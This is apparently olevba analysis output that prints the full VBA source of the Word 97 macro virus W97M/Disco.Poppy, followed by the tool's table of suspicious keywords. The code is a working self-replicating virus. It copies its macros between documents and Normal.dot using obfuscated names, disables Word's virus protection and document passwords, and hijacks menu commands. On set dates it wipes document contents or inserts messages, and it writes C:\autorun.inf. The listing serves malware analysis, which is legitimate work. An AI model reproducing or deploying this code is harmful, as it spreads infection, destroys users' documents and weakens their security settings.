olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Poppy.b-7ce271716980a79bd1ffda4b01ee6c9d1a0aeb01
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Poppy.b-7ce271716980a79bd1ffda4b01ee6c9d1a0aeb01 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Poppy.b-7ce271716980a79bd1ffda4b01ee6c9d1a0aeb01 - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub AutoOpen()

'Macro.Poppy.I aka "W97M/Disco.Poppy"
'By VicodinES
'Macro Virus for Word 97
'"this is step one in the big understanding"

Dim Mac$
Dim Soma$
Dim Heroin
Dim Valium$
Dim Klonopin$
Dim A$
Dim T$
Dim p$
Dim ft$
Dim fx$
Dim ok$
Dim ICD$
    
    On Error GoTo -1: On Error GoTo hell
    T$ = "t" + "oo" + "l" + "s" + "m" + "a" + "c" + "r" + "o"
    p$ = "f" + "i" + "l" + "e" + "p" + "ri" + "nt"
    ft$ = "Fi" + "le" + "Te" + "mp" + "la" + "t" + "es"
    fx$ = "F" + "i" + "l" + "e" + "E" + "x" + "i" + "t"
    A$ = "a" + "u" + "to" + "O" + "p" + "en"
    Valium$ = "N" + "O" + "R" + "M" + "A" + "L" + "." + "D" + "OT"
    Klonopin$ = "H" + "e" + "l" + "p" + "A" + "b" + "ou" + "t"
    ICD$ = "Disco"
    ok$ = 0
    
    Soma$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If Soma$ = Valium$ Then
        
        Heroin = GetAttr(ActiveDocument.FullName)
        
        If Heroin >= vbArchive Then ok$ = 1
        If Heroin >= vbSystem Then ok$ = 1
        If Heroin >= vbHidden Then ok$ = 1
        If ok$ = 1 Then
        
        For X = 1 To 7
            If X = 1 Then Mac$ = A$
            If X = 2 Then Mac$ = T$
            If X = 3 Then Mac$ = p$
            If X = 4 Then Mac$ = ft$
            If X = 5 Then Mac$ = fx$
            If X = 6 Then Mac$ = Klonopin$
            If X = 7 Then Mac$ = ICD$
            
            Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:=Mac$, Object:= _
        wdOrganizerObjectProjectItems
            
        Next X
        
            WordBasic.FileSaveAs Format:=1
            WordBasic.SetDocumentDirty 0
            Call dhIconDisco("C:\autorun.inf")
            
        End If
    Else
               
        For X = 1 To 7
            If X = 1 Then Mac$ = A$
            If X = 2 Then Mac$ = T$
            If X = 3 Then Mac$ = p$
            If X = 4 Then Mac$ = ft$
            If X = 5 Then Mac$ = fx$
            If X = 6 Then Mac$ = Klonopin$
            If X = 7 Then Mac$ = ICD$
                           
        Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:=Mac$, Object:= _
        wdOrganizerObjectProjectItems
        
        Next X
        
    End If
    
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = False
        .Password = ""
        .WritePassword = ""
    End With

'        Application.OrganizerDelete Source:= _
'        NormalTemplate.FullName, Name:="Cap", Object:= _
'        wdOrganizerObjectProjectItems
        
GoTo fuckoff

hell:
        
fuckoff:
    On Error GoTo -1: On Error GoTo 0


End Sub
Sub ViewVBCode()
'Macro.Poppy.I aka "W97M/Disco.Poppy"
'By VicodinES
'Macro Virus for Word 97
'"this is step one in the big understanding"

MsgBox "  W97M/Disco.Poppy by VicodinES  ", vbOKOnly, " © The Narkotic Network "
MsgBox "Everything is fine - nothing to see here - let's move it along kids!", vbExclamation, " * VicodinES * Klonopin.Jones * Fastin.Blee * "
MsgBox "Social camouflage for this modern age!", vbQuestion, "Slogan?"
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.Poppy.b-7ce271716980a79bd1ffda4b01ee6c9d1a0aeb01 - OLE stream: 'Macros/VBA/toolsmacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub ToolsMacro()
Attribute ToolsMacro.VB_Description = "Runs, creates, deletes, or revises a macro"
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "TemplateProject.toolsmacro.MAIN"

'Macro.Poppy.I aka "W97M/Disco.Poppy"
'By VicodinES
'Macro Virus for Word 97
'"this is step one in the big understanding"

    Dim D$
    Dim Ti$
    Dim Tp$
    Dim Z


    Ti$ = Time
    Tp$ = "12:00:01 PM"
    D$ = Date


    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    Z = 0
    
    If D$ = "4/12/98" Then Z = 1
    If Ti$ = Tp$ Then Z = 1
    If D$ = "4/12/99" Then Z = 1
    If D$ = "1/11/98" Then Z = 1
    If D$ = "1/11/99" Then Z = 1
    If D$ = "6/14/99" Then Z = 1
    If D$ = "1/22/98" Then Z = 1
    If D$ = "8/21/98" Then Z = 1
    If D$ = "9/19/99" Then Z = 1
    If D$ = "8/18/99" Then Z = 1
    If D$ = "7/9/99" Then Z = 1
    If D$ = "12/17/99" Then Z = 1
    If D$ = "8/18/98" Then Z = 1
    If D$ = "7/9/98" Then Z = 1
    If D$ = "12/17/98" Then Z = 1
    
If Z = 1 Then

    With Options
        .CheckSpellingAsYouType = False
        .CheckGrammarAsYouType = False
        .SuggestSpellingCorrections = False
        .SuggestFromMainDictionaryOnly = False
        .CheckGrammarWithSpelling = True
        .ShowReadabilityStatistics = False
        .IgnoreUppercase = True
        .IgnoreMixedDigits = True
        .IgnoreInternetAndFileAddresses = True

    End With

    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Macro.Poppy.I aka Disco.Poppy"
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "By VicodinES"
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Macro Virus for Word 97"
    Selection.TypeParagraph
        Selection.TypeParagraph
            Selection.TypeParagraph
                Selection.TypeParagraph
    Selection.TypeText Text:= _
        "T h e   N a r k o t i c   N e t w o r k !"
    Selection.TypeParagraph
    
Else

GoTo fuck1

End If

fuck1:

End Sub

-------------------------------------------------------------------------------
VBA MACRO fileprint.bas 
in file: Virus.MSWord.Poppy.b-7ce271716980a79bd1ffda4b01ee6c9d1a0aeb01 - OLE stream: 'Macros/VBA/fileprint'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub fileprint()

'Macro.Poppy.I aka "W97M/Disco.Poppy"
'By VicodinES
'Macro Virus for Word 97
'"this is step one in the big understanding"

    Dim D$
    Dim Ti$
    Dim Tp$
    Dim Z

    Ti$ = Time
    Tp$ = "12:00:01 PM"
    D$ = Date
    
    Z = 0
    
    If D$ = "4/12/98" Then Z = 1
    If Ti$ = Tp$ Then Z = 1
    If D$ = "4/12/99" Then Z = 1
    If D$ = "1/11/98" Then Z = 1
    If D$ = "1/11/99" Then Z = 1
    If D$ = "6/14/99" Then Z = 1
    If D$ = "1/22/98" Then Z = 1
    If D$ = "8/21/98" Then Z = 1
    If D$ = "9/19/99" Then Z = 1
    If D$ = "8/18/99" Then Z = 1
    If D$ = "7/9/99" Then Z = 1
    If D$ = "12/17/99" Then Z = 1
    If D$ = "8/18/98" Then Z = 1
    If D$ = "7/9/98" Then Z = 1
    If D$ = "12/17/98" Then Z = 1
        
    If Z = 1 Then
    
    Selection.EndKey Unit:=wdLine
    Selection.MoveDown Unit:=wdScreen, Count:=1
    Selection.EndKey Unit:=wdLine
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "When will you wake up and realize that we live in a "
    Selection.TypeText Text:= _
        "primitive society? Don't kid yourself - there is NO GOD!!"
        
    ActiveDocument.PrintOut
    
    
Else

    ActiveDocument.PrintOut
    
End If

End Sub
    
    
        




-------------------------------------------------------------------------------
VBA MACRO FileTemplates.bas 
in file: Virus.MSWord.Poppy.b-7ce271716980a79bd1ffda4b01ee6c9d1a0aeb01 - OLE stream: 'Macros/VBA/FileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileTemplates()
'Macro.Poppy.I aka "W97M/Disco.Poppy"
'By VicodinES
'Macro Virus for Word 97
'"this is step one in the big understanding"

    Dim D$
    Dim Ti$
    Dim Tp$
    Dim Z

    Ti$ = Time
    Tp$ = "12:00:01 PM"
    D$ = Date
    
    Z = 0
    
    If D$ = "4/12/98" Then Z = 1
    If Ti$ = Tp$ Then Z = 1
    If D$ = "4/12/99" Then Z = 1
    If D$ = "1/11/98" Then Z = 1
    If D$ = "1/11/99" Then Z = 1
    If D$ = "6/14/99" Then Z = 1
    If D$ = "1/22/98" Then Z = 1
    If D$ = "8/21/98" Then Z = 1
    If D$ = "9/19/99" Then Z = 1
    If D$ = "8/18/99" Then Z = 1
    If D$ = "7/9/99" Then Z = 1
    If D$ = "12/17/99" Then Z = 1
    If D$ = "8/18/98" Then Z = 1
    If D$ = "7/9/98" Then Z = 1
    If D$ = "12/17/98" Then Z = 1
    
    
If Z = 1 Then

    With Options
        .CheckSpellingAsYouType = False
        .CheckGrammarAsYouType = False
        .SuggestSpellingCorrections = False
        .SuggestFromMainDictionaryOnly = False
        .CheckGrammarWithSpelling = True
        .ShowReadabilityStatistics = False
        .IgnoreUppercase = True
        .IgnoreMixedDigits = True
        .IgnoreInternetAndFileAddresses = True

    End With

    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Macro.Poppy.I aka Disco.Poppy"
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "By VicodinES"
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Macro Virus for Word 97"
    Selection.TypeParagraph
        Selection.TypeParagraph
            Selection.TypeParagraph
                Selection.TypeParagraph
    Selection.TypeText Text:= _
        "T h e   N a r k o t i c   N e t w o r k !"
    Selection.TypeParagraph
    
Else

GoTo fuck1

End If

fuck1:


End Sub
-------------------------------------------------------------------------------
VBA MACRO FileExit.bas 
in file: Virus.MSWord.Poppy.b-7ce271716980a79bd1ffda4b01ee6c9d1a0aeb01 - OLE stream: 'Macros/VBA/FileExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileExit()
Attribute FileExit.VB_Description = "Macro recorded 12/13/97 by Dr. Diet Mountain Dew"
Attribute FileExit.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Macro1"

'Macro.Poppy.I aka "W97M/Disco.Poppy"
'By VicodinES
'Macro Virus for Word 97
'"this is step one in the big understanding"

    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With

    Application.Quit

End Sub
-------------------------------------------------------------------------------
VBA MACRO HelpAbout.bas 
in file: Virus.MSWord.Poppy.b-7ce271716980a79bd1ffda4b01ee6c9d1a0aeb01 - OLE stream: 'Macros/VBA/HelpAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub HelpAbout()

'Macro.Poppy.I aka "W97M/Disco.Poppy"
'By VicodinES
'Macro Virus for Word 97
'"this is step one in the big understanding"

MsgBox "  W97M/Disco.Poppy by VicodinES  ", vbOKOnly, " © The Narkotic Network "
MsgBox "Everything is fine - nothing to see here - let's move it along kids!", vbExclamation, " * VicodinES * Klonopin.Jones * Fastin.Blee * "
MsgBox "Social camouflage for this modern age!", vbQuestion, "Slogan?"
End Sub
-------------------------------------------------------------------------------
VBA MACRO Disco.bas 
in file: Virus.MSWord.Poppy.b-7ce271716980a79bd1ffda4b01ee6c9d1a0aeb01 - OLE stream: 'Macros/VBA/Disco'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub dhIconDisco(strFile As String)

'Macro.Poppy.I aka "W97M/Disco.Poppy"
'By VicodinES
'Macro Virus for Word 97
'"this is step one in the big understanding"


Dim Part1$
Dim Part2$
Dim Part22$
Dim Part3$
Dim Part33$
Dim rn$
Dim rnn$
Dim Choice
Dim hFile As Long

Choice = Int(Rnd * 2)
rnn$ = Int(Rnd * 66) + 2
rn$ = Int(Rnd * 27) + 1
Part1$ = "[autorun]"
Part2$ = "icon = c:\windows\system\pifmgr.dll,"
Part22$ = "icon = c:\windows\SYSTEM\shell32.dll,"
Part3$ = Part2$ + rn$
Part33$ = Part22$ + rnn$


    hFile = FreeFile
    Open strFile For Output Access Write As hFile
    Print #hFile, Part1$
    If Choice = 0 Then
        Print #hFile, Part3$
    Else
        Print #hFile, Part33$
    End If
    Close hFile


    
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autorun.inf         |Executable file name                         |
|IOC       |pifmgr.dll          |Executable file name                         |
|IOC       |shell32.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+
